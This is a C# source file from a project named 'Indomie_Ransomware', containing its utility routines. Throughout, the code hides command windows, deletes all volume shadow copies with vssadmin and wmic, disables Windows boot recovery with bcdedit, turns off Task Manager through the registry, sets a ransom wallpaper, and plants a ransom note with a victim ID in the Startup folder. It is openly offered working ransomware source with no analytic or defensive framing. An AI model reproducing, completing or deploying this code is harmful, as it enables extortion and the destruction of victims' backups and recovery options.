using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;

namespace Indomie_Ransomware.System
{
    internal class Utils
    {
        static string appMutex = "idomine7dqwelazzlsads";
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern Int32 SystemParametersInfo(UInt32 action, UInt32 uParam, String vParam, UInt32 winIni);
        public static bool IsAdmin()
        {
            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
            {
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
        }
        public static void CreateMutex()
        {
            bool CreateNew = false;
            Mutex mutex = new Mutex(true, appMutex, out CreateNew);
            if (!CreateNew)
            {
                //mutex.Dispose();
                Environment.Exit(0);
            }
        }
        private static void RunCommand(string commands)
        {
            Process process = new Process();
            ProcessStartInfo startInfo = new ProcessStartInfo();
            //startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.FileName = "cmd.exe";

            startInfo.Arguments = "/C " + commands;
            //startInfo.Arguments = "/C ";
            //startInfo.Arguments = "/C ping google.com";
            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
            process.StartInfo = startInfo;
            process.Start();
            process.WaitForExit();
        }
        public static void DeleteShadowCopies()
        {
            if (IsAdmin())
            {
                RunCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
            }
            else
            {
                Console.WriteLine("Is not admin");
            }
        }
        public static void DisableRecoveryMode()
        {
            if (IsAdmin())
            {
                RunCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
            }
            else
            {
                Console.WriteLine("Is not admin");
            }
        }
        public static void DisableTaskManager()
        {
            try
            {
                Microsoft.Win32.RegistryKey objRegistryKey =
                    Microsoft.Win32.Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                objRegistryKey.SetValue("DisableTaskMgr", "1");

                objRegistryKey.Close();
            }
            catch { }
        }
        public static void SetWallpaper()
        {
            try
            {
                byte[] wpp = Convert.FromBase64String(Config.WallpaperBase64);
                string tempPath = Path.GetTempPath() + "sdadqwekqwe.jpg";
                File.WriteAllBytes(tempPath, wpp);
                SystemParametersInfo(0x14, 0, tempPath, 0x01 | 0x02);
            } catch { }
        }
        public static void CreateRansNote()
        {
            string DecID = SystemInfo.GetSystemMD5();
            Config.RansomwareNote = Config.RansomwareNote.Replace("%ID%", DecID);
        }
        public static void CopyRansNoteToStartup()
        {
            string startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
            string readmePath = Path.Combine(startupFolder, "README.txt");
            try
            {
                string tempPath = Path.GetTempPath() + "\\aosqweq.txt";
                File.WriteAllText(tempPath, Config.RansomwareNote);
                File.Copy(tempPath, readmePath);
                Process.Start(tempPath);
            } catch { }
        }
    }
}
